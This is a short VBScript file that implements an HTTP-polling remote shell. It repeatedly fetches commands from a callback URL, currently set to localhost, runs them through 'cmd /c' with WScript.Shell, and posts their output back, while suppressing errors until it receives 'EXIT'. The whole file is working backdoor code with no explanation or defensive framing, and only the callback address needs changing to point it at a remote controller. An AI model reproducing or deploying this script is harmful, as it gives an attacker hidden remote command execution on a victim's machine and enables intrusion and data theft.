Option Explicit
On Error Resume Next

Const callbackUrl = "http://localhost:80/"

Dim xmlHttpReq, shell, execObj, command, break, result

Set shell = CreateObject("WScript.Shell")

break = False
Do While break <> True
    Set xmlHttpReq = CreateObject("MSXML2.ServerXMLHTTP")
    xmlHttpReq.Open "GET", callbackUrl, False
    xmlHttpReq.Send

    command = "cmd /c " & Trim(xmlHttpReq.responseText)

    If InStr(command, "EXIT") > 0 Then
        break = True
    Else
        Set execObj = shell.Exec(command)

        result = ""
        Do Until execObj.StdOut.AtEndOfStream
            result = result & execObj.StdOut.ReadAll()
        Loop

        Set xmlHttpReq = CreateObject("MSXML2.ServerXMLHTTP")
        xmlHttpReq.Open "POST", callbackUrl, False
        xmlHttpReq.Send result
    End If
Loop
